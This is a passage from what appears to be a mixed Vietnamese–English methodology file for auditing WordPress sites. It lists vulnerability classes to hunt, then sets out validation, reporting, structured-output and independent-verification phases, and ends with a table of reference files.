6. **Feature Abuse** — export/search oracle/enumeration/preview leakage/webhook SSRF
7. **HTTP Protocol & Auth** — cache poisoning, Host header, JWT/session defects (ref: `references/http-protocol-auth.md`)
8. **Client-Side** — DOM XSS, postMessage, CORS, clickjacking (ref: `references/client-side-browser.md`)
9. **Chained Attacks** — multi-step chains, second-order attacks, cross-plugin trust
10. **Obvious Things** — hardcoded secrets, debug modes, test credentials, `.env` files

### Phase 3 — Validate (adversarial)

Consolidate duplicates → validate từng finding bằng agent riêng cố **bác bỏ** nó.

Xem quy trình đầy đủ tại `references/validation-reporting.md`.

5 tests: Exploitation, Impact, Baseline, Mitigation, Parser/runtime behavior.

Kill false positives aggressively. 3 real findings > 30 theoretical.

### Phase 4 — Report

Output files:
- `audit-report-YYYY-MM-DD-<domain>.md` — Main report (format chuẩn: symptom → root cause → evidence → attack summary → actions → recommendations)
- `findings-detail-YYYY-MM-DD-<domain>.md` — Data flow đầy đủ cho MEDIUM+ findings

Xem format chi tiết tại `references/validation-reporting.md`.

### Phase 5 — Structured Output

`findings.json` theo schema tại `references/validation-reporting.md`.

Severity: `critical`, `high`, `medium`, `low`, `informational` (lowercase).

### Phase 6 — Independent Verification

1 verification agent per confirmed finding, verify độc lập:
- File path và line number đúng?
- Root cause có trong code?
- Payloads thực sự work?
- Prerequisites đủ?
- Remediation fix được attack?

---

## References

| File | Dùng khi |
|---|---|
| `references/interpreting-results.md` | Đọc output audit.sh — mọi section |
| `references/malware-cleanup.md` | Site bị compromise — cleanup procedure |
| `references/cloudpanel-env.md` | Cấu hình CloudPanel, nginx vhost, PHP-FPM |
| `references/hunting-methodology.md` | Deep audit — 12 góc tấn công + validation rules |
| `references/attack-classes.md` | Deep audit — 10 attack classes WP-specific |
| `references/http-protocol-auth.md` | Deep audit — cache, JWT, session, password reset |
| `references/client-side-browser.md` | Deep audit — DOM XSS, postMessage, CORS, clickjacking |
| `references/validation-reporting.md` | Deep audit — Phase 3–6, report format, findings.json schema |
